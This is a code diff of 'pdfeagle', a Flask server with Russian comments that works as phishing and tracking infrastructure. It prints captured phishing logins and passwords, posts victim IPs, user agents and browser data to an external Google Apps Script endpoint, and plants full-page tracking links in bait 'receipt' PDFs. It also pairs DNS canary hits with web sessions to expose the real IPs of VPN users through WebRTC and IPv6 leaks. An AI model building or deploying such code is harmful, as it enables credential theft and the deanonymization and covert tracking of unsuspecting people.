@@ -1,3 +1,4 @@
+--- START OF FILE pdfeagle-main/app.py ---
 import os
 import json
 import threading
@@ -17,10 +18,14 @@ if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
 
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}
-# Твой Google Script URL
+
+# !!! ЗАМЕНИТЕ НА СВОЙ GOOGLE SCRIPT URL !!!
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"
 
-# --- БАЗА ДАННЫХ ---
+# Хранилище сессий в памяти (для корреляции DNS и HTTP на лету)
+active_sessions = {}
+
+# --- БАЗА ДАННЫХ (Файловая) ---
 def load_db():
     if os.path.exists(DB_FILE):
         try:
@@ -38,18 +43,47 @@ db = load_db()
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
+# --- АНАЛИЗАТОР УТЕЧЕК ---
+def analyze_leaks(server_ip, client_data):
+    leaks = []
+    
+    # 1. WebRTC Leak (Если WebRTC IP отличается от IP, который видит сервер)
+    webrtc = client_data.get('network', {}).get('webrtc', {})
+    public_ips = webrtc.get('publicIPv4', []) + webrtc.get('publicIPv6', [])
+    
+    for ip in public_ips:
+        if ip != server_ip:
+            leaks.append(f"CRITICAL: WebRTC Leak! Real IP: {ip} (VPN IP: {server_ip})")
+
+    # 2. IPv6 Leak
+    ipv6_data = client_data.get('network', {}).get('ipv6', {})
+    if ipv6_data.get('detected'):
+        leaks.append(f"HIGH: IPv6 Leak Detected: {ipv6_data.get('ip')}")
+
+    # 3. Timezone Mismatch (Гео IP не совпадает с часовым поясом браузера)
+    # Это базовая эвристика, можно улучшить с GeoIP базой
+    tz = client_data.get('timeLocale', {}).get('timezone', 'Unknown')
+    
+    return leaks
+
 # --- ЛОГГЕР ---
-def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
+def send_email_background(data, user_ip, user_agent, trigger_type="Page Load", leaks=None):
     try:
-        # ПИШЕМ ПАРОЛЬ В КОНСОЛЬ (для отладки на Render)
-        if 'system' in data and 'phishing_password' in data['system']:
-            print(f"\n[!!!] CREDENTIALS CAPTURED: {data['system']['phishing_login']} : {data['system']['phishing_password']}\n")
+        # Лог в консоль Render
+        print(f"\n[{datetime.datetime.now()}] TRIGGER: {trigger_type} | IP: {user_ip}")
+        if leaks:
+            for leak in leaks:
+                print(f"  [!] {leak}")
         
+        if 'system' in data and 'phishing_password' in data['system']:
+            print(f"  [!!!] CREDENTIALS: {data['system']['phishing_login']} : {data['system']['phishing_password']}")
+
         payload = {
             "trigger": trigger_type,
             "ip": user_ip,
             "user_agent": user_agent,
             "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "leaks": leaks if leaks else [],
             "details": data
         }
         requests.post(GOOGLE_SCRIPT_URL, json=payload)
@@ -70,7 +104,6 @@ def generate_receipt(uid, filename):
     pdf.cell(200, 10, txt=f"ID: {uid}", ln=1)
     pdf.set_text_color(255, 0, 0)
     pdf.cell(200, 10, txt="STATUS: PENDING. CLICK TO OPEN.", ln=1)
-    # Ссылка внутри PDF (Web Bug)
     tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
     pdf.link(0, 0, 210, 297, tracking_url)
     receipt_name = f"receipt_{uid}.pdf"
@@ -82,44 +115,35 @@ def generate_receipt(uid, filename):
 @app.route('/health')
 def health_check(): return "OK", 200
 
-# === НОВЫЙ ROUTE: WEBHOOK ДЛЯ CANARYTOKENS ===
+# === WEBHOOK ДЛЯ CANARYTOKENS (СВЯЗКА DNS И HTTP) ===
 @app.route('/webhook', methods=['POST'])
 def canary_webhook():
     try:
-        # Canarytokens может слать данные как JSON или Form Data
         data = request.json or request.form.to_dict()
         
-        # Пытаемся извлечь IP DNS-сервера (это самое ценное при утечке)
-        canary_ip = "Unknown"
-        if 'source_ip' in data: canary_ip = data['source_ip']
-        elif 'ip' in data: canary_ip = data['ip']
+        # Пытаемся достать session_id из hostname (subdomain)
+        # Формат: session_id.ts.rand.token.com
+        hostname = data.get('hostname', '') or data.get('additional_data', {}).get('src_ip', '')
+        parts = hostname.split('.')
+        session_id = parts[0] if len(parts) > 3 else "unknown"
         
-        # Формируем отчет
-        report_data = {
-            "meta": {
-                "trigger": "DNS LEAK DETECTED (Canary)",
-                "url": "Webhook Hit",
-                "info": "This IP belongs to the DNS server used by the victim. If different from VPN IP -> LEAK CONFIRMED."
-            },
-            "network": {
-                "dns_leak_ip": canary_ip,
-                "full_canary_payload": data
-            }
-        }
+        resolver_ip = data.get('source_ip') or data.get('ip')
         
-        # Отправляем в Google Script
-        threading.Thread(target=send_email_background, args=(report_data, canary_ip, "Canarytokens Webhook", "DNS LEAK")).start()
+        print(f"\n[DNS EVENT] Session: {session_id} | Resolver: {resolver_ip}")
+        
+        # Если сессия активна, добавляем инфо о DNS
+        if session_id in active_sessions:
+            active_sessions[session_id]['dns_resolver'] = resolver_ip
+            print(f"  [+] Correlated with HTTP Session IP: {active_sessions[session_id]['http_ip']}")
         
         return jsonify({"status": "logged"}), 200
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)}), 500
-# =============================================
 
 @app.route('/pixel.gif')
 def tracking_pixel():
     source = request.args.get('source', 'unknown')
     uid = request.args.get('uid', 'unknown')
-    # Получаем реальный IP для пикселя
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     threading.Thread(target=send_email_background, args=({'meta': {'url': f'PDF TRAP ({uid})', 'source': source}}, ip, "PDF Reader", "PDF OPENED")).start()
     return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})
@@ -184,22 +208,29 @@ def collect_data():
         else:
             data = json.loads(request.data.decode('utf-8'))
         
-        # Получаем реальный IP из заголовков Render/Cloudflare
+        # Реальный IP через прокси
         forwarded_for = request.headers.get('X-Forwarded-For', '')
         if forwarded_for:
             real_ip = forwarded_for.split(',')[0].strip()
         else:
             real_ip = request.remote_addr
 
-        if 'network' not in data: data['network'] = {}
-        data['network']['server_detected_ip'] = real_ip
-        data['network']['raw_headers_ip'] = forwarded_for
+        # Сохраняем сессию для корреляции с DNS
+        session_id = data.get('meta', {}).get('sessionId')
+        if session_id:
+            active_sessions[session_id] = {
+                'http_ip': real_ip,
+                'timestamp': datetime.datetime.now()
+            }
+
+        # Анализ утечек
+        leaks = analyze_leaks(real_ip, data)
         
         user_agent = request.headers.get('User-Agent')
         trigger = data.get('meta', {}).get('trigger', 'Unknown')
         
-        threading.Thread(target=send_email_background, args=(data, real_ip, user_agent, trigger)).start()
-        return jsonify({"status": "ok"})
+        threading.Thread(target=send_email_background, args=(data, real_ip, user_agent, trigger, leaks)).start()
+        return jsonify({"status": "ok", "leaks_found": len(leaks)})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
 
